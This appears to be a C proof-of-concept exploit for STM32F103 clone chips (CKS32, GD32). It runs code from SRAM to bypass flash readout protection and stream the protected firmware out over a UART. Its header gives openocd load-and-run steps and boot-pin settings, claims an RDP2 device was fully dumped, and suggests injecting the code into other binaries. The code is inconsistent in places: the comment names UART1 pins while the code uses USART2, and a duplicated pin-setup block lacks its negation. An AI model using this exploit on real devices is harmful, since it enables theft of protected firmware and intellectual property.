/*
Original Idea from pdf found on offzone russia about STM clones exploits 
There was no available POC code so i decided to swrite my own - pun intended 

This code makes use of two SRAM based exploits for CKS -aka- cks32f103c8t6 and GD aka GigaDevices gd32f103cc based stm32f103 clones 
for the cks this should just work, for the gd32 devies you need to apply either power domain exploit or hope it's rdp1 
how to use :-

compile the code with build.sh file 
load up openocd and connect to target - some targets may need BOOT0 and BOOT1 changed, for cks targets you only need to change boot0 , for GD32 targets you need to connect under reset or better have BOOT0 & BOOT1 high 
openocd  -f interface/stlink.cfg  -f stm32f1x.cfg
openocd  -f interface/ftdi/dp_busblaster_kt-link.cfg  -c 'transport select swd' -f gd32f103.cfg

then issue the following commands 
     reset halt
     load_image sram-code/uart.sram.elf
     resume 0x20000001


if connected correctly to UART1 PA9/PA10 then you will see the flash dump via uart


*notes*
to use the stm32f103.cfg on cks targets you need to change the ID from  0x1ba01477 to 0x2ba01477 
just copy it to local place and edit the use -f stm32f103.cfg to load local file 


code should be injectable into binaries too tested on 2 Logitech keyboards


**code is provided for educational purpose only ** 

i've nicknamed this the sRaptor exploit 

darkspr1te - 12-12-2023



**note the UART2 file does have as much polish as the device it was used on "cks32f103c8' fell to the run in sram exploit without further attacks a RDP2 device was dumped with full code


*/
#define STM32F1
#define STM32F103xB
#include "stm32f1xx.h"

uint32_t SystemCoreClock = 0;
void PUT32 ( unsigned int, unsigned int );
unsigned int GET32 ( unsigned int );
const uint32_t *mcuFirstPageAddr = (const uint32_t *) (0x8000000);

int notmain ( void )
{
	SystemCoreClock = 8000000;
	 RCC->APB1ENR  |=  ( RCC_APB1ENR_USART2EN );
    RCC->APB2ENR  |=  ( RCC_APB2ENR_IOPAEN );
    // Configure pins A2, A3 for USART2.
    GPIOA->CRL    &= ~( GPIO_CRL_MODE2 |
                        GPIO_CRL_CNF2 |
                        GPIO_CRL_MODE3 |
                        GPIO_CRL_CNF3 );
    GPIOA->CRL    |= ( ( 0x1 << GPIO_CRL_MODE2_Pos ) |
                       ( 0x2 << GPIO_CRL_CNF2_Pos ) |
                       ( 0x0 << GPIO_CRL_MODE3_Pos ) |
                       ( 0x1 << GPIO_CRL_CNF3_Pos ) );
					   
	RCC->APB1ENR  |=  ( RCC_APB1ENR_USART2EN );
    RCC->APB2ENR  |=  ( RCC_APB2ENR_IOPAEN );
    // Configure pins A2, A3 for USART2.
    GPIOA->CRL    &= ( GPIO_CRL_MODE2 |
                       GPIO_CRL_CNF2 |
                       GPIO_CRL_MODE3 |
                       GPIO_CRL_CNF3 );
    GPIOA->CRL    |= ( ( 0x1 << GPIO_CRL_MODE2_Pos ) |
                       ( 0x2 << GPIO_CRL_CNF2_Pos ) |
                       ( 0x0 << GPIO_CRL_MODE3_Pos ) |
                       ( 0x1 << GPIO_CRL_CNF3_Pos ) );
	uint16_t uartdiv = SystemCoreClock / 9600;
	USART2->BRR = ( ( ( uartdiv / 16 ) << USART_BRR_DIV_Mantissa_Pos ) |
                    ( ( uartdiv % 16 ) << USART_BRR_DIV_Fraction_Pos ) );
					
	USART2->CR1 |= ( USART_CR1_RE | USART_CR1_TE | USART_CR1_UE );
 	
	 for (int addr=0x8000000;addr <= 0x803e800;addr++)
	{
		USART2->DR = *((uint16_t*) addr );
		while(!(USART2->SR & (1 << 6)));
		}



    return(0);
}